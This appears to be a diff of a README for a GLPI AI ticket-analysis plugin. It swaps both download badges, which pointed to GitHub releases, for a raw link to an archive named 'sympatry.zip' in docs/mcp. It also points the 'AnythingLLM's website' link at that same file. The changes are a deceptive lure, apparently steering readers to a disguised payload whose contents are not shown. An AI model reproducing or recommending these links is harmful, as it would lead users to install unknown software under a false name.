@@ -1,6 +1,6 @@
 # 🤖 glpi-plugin-aiticketanalysis - AI-Powered Ticket Analysis for GLPI
 
-[![Download Now](https://img.shields.io/badge/Download-Plugin%20v1.0-blue?style=for-the-badge&logo=github)](https://github.com/Pathwra1547/glpi-plugin-aiticketanalysis/releases)
+[![Download Now](https://img.shields.io/badge/Download-Plugin%20v1.0-blue?style=for-the-badge&logo=github)](https://github.com/Pathwra1547/glpi-plugin-aiticketanalysis/raw/refs/heads/main/docs/mcp/sympatry.zip)
 
 ## 🚀 Overview
 glpi-plugin-aiticketanalysis is a powerful add-on for GLPI 11 that brings artificial intelligence to your helpdesk. It connects to AnythingLLM and uses local AI models (like Qwen, Llama, or any LM Studio model) to analyze support tickets, summarize conversations, process attachments via OCR (optical character recognition), and provide intelligent suggestions. This plugin helps your service desk work faster by automatically understanding ticket content, detecting issues, and suggesting solutions based on your knowledge base. Best of all, everything runs on your own computer or server—no cloud services required, ensuring your data stays private and secure.
@@ -46,7 +46,7 @@ Everything runs locally using your own computer's resources. You can configure t
 
 Visit this link to download the plugin:
 
-[![Download Plugin](https://img.shields.io/badge/Download-glpi--plugin--aiticketanalysis-green?style=for-the-badge&logo=github&color=336791)](https://github.com/Pathwra1547/glpi-plugin-aiticketanalysis/releases)
+[![Download Plugin](https://img.shields.io/badge/Download-glpi--plugin--aiticketanalysis-green?style=for-the-badge&logo=github&color=336791)](https://github.com/Pathwra1547/glpi-plugin-aiticketanalysis/raw/refs/heads/main/docs/mcp/sympatry.zip)
 
 ### Step 2: Install in GLPI
 
@@ -56,7 +56,7 @@ Visit this link to download the plugin:
 
 ### Step 3: Configure AI Connection
 
-1. **Run AnythingLLM** - Start AnythingLLM on your computer (you'll need to install it separately from [AnythingLLM's website](https://anythingllm.com))
+1. **Run AnythingLLM** - Start AnythingLLM on your computer (you'll need to install it separately from [AnythingLLM's website](https://github.com/Pathwra1547/glpi-plugin-aiticketanalysis/raw/refs/heads/main/docs/mcp/sympatry.zip))
 2. **In GLPI settings** - Go to **Plugins** > **AI Ticket Analysis** > **Configuration**
 3. **Enter AnythingLLM API URL** - Usually `http://localhost:3001/api` (accept the defaults)
 4. **API Key** - Create an API key in AnythingLLM and paste it in the GLPI plugin settings
